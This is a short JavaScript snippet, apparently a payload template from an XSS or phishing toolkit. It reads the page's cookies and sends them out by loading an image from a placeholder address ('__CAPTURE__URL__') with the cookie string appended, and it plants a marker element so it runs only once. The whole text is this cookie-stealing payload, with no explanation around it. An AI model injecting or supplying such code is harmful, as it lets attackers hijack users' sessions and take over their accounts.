if (document.getElementById('cookcap') == null) {
    var ck = document.cookie;
    sestime = Date.now();
    new Image().src = '__CAPTURE__URL__' + ck;
    script = document.createElement('script');
    script.id = 'cookcap';
    document.body.appendChild(script);
}